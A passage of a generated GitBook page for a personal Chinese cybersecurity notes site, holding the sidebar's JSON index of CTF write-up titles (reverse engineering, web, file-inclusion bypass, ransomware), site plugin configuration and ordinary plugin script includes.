Connect","level":"1.4.2.1.3.6","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Emoji_Connect.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Emoji_Connect.md","articles":[]},{"title":"Findkey","level":"1.4.2.1.3.7","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/findkey.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/findkey.md","articles":[]},{"title":"Map","level":"1.4.2.1.3.8","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/map.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/map.md","articles":[]},{"title":"Poisoned Tea CHELL","level":"1.4.2.1.3.9","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Poisoned_tea_CHELL.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Poisoned_tea_CHELL.md","articles":[]},{"title":"Pytrans","level":"1.4.2.1.3.10","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Pytrans.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Pytrans.md","articles":[]},{"title":"RC 4","level":"1.4.2.1.3.11","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/RC4.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/RC4.md","articles":[]},{"title":"Smali","level":"1.4.2.1.3.12","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/Smali.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/Smali.md","articles":[]},{"title":"Sum","level":"1.4.2.1.3.13","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/sum.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/sum.md","articles":[]},{"title":"XOR","level":"1.4.2.1.3.14","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/XOR.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/XOR.md","articles":[]},{"title":"填数游戏","level":"1.4.2.1.3.15","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/填数游戏.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/填数游戏.md","articles":[]},{"title":"珍贵资料","level":"1.4.2.1.3.16","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Reverse/珍贵资料.md","ref":"网络安全/CTF竞赛/蓝桥杯/Reverse/珍贵资料.md","articles":[]}]},{"title":"Web","level":"1.4.2.1.4","depth":4,"ref":"","articles":[{"title":"Web 01 1","level":"1.4.2.1.4.1","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web01-1.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web01-1.md","articles":[]},{"title":"Web 01 2","level":"1.4.2.1.4.2","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web01-2.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web01-2.md","articles":[]},{"title":"Web 02","level":"1.4.2.1.4.3","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web02.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web02.md","articles":[]},{"title":"Web 03 1","level":"1.4.2.1.4.4","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/web03-1.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/web03-1.md","articles":[]},{"title":"文件包含绕过","level":"1.4.2.1.4.5","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Web/文件包含绕过.md","ref":"网络安全/CTF竞赛/蓝桥杯/Web/文件包含绕过.md","articles":[]}]},{"title":"单选题","level":"1.4.2.1.5","depth":4,"path":"网络安全/CTF竞赛/蓝桥杯/单选题.md","ref":"网络安全/CTF竞赛/蓝桥杯/单选题.md","articles":[]},{"title":"多选题","level":"1.4.2.1.6","depth":4,"path":"网络安全/CTF竞赛/蓝桥杯/多选题.md","ref":"网络安全/CTF竞赛/蓝桥杯/多选题.md","articles":[]}]},{"title":"赣育杯","level":"1.4.2.2","depth":3,"ref":"","articles":[{"title":"Areyubot","level":"1.4.2.2.1","depth":4,"path":"网络安全/CTF竞赛/赣育杯/Areyubot.md","ref":"网络安全/CTF竞赛/赣育杯/Areyubot.md","articles":[]},{"title":"勒索病毒","level":"1.4.2.2.2","depth":4,"path":"网络安全/CTF竞赛/赣育杯/勒索病毒.md","ref":"网络安全/CTF竞赛/赣育杯/勒索病毒.md","articles":[]}]}]},"previous":{"title":"服务配置文件探测","level":"1.4.1.10","depth":3,"path":"网络安全/AWD/服务配置文件探测.md","ref":"网络安全/AWD/服务配置文件探测.md","articles":[]},"dir":"ltr"},"config":{"plugins":["theme-comscore","-lunr","-search","search-pro","expandable-chapters","chapter-fold","splitter","github","page-toc-button","back-to-top-button","tbfed-pagefooter","code","accordion","prism","-sharing","sharing-plus","hide-element"],"styles":{},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu","modify_label":"最近一修改时间：","modify_format":"YYYY-MM-DD HH:mm"},"page-treeview":{"copyright":"Copyright &#169; aleen42","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"]},"github":{"url":"https://github.com/feiyu-195"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"theme-comscore":{},"page-toc-button":{"maxTocDepth":2,"minTocSize":2},"back-to-top-button":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"scripts":{"start":"assets/umami.js"},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"SkyFish","language":"zh-hans","gitbook":"*","description":"这是我的简介..."},"file":{"path":"网络安全/AWD/浅谈AWD攻防赛的生存攻略.md","mtime":"2024-11-15T13:49:40.133Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-03-30T14:50:58.649Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-page-toc-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-accordion/accordionSelector.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
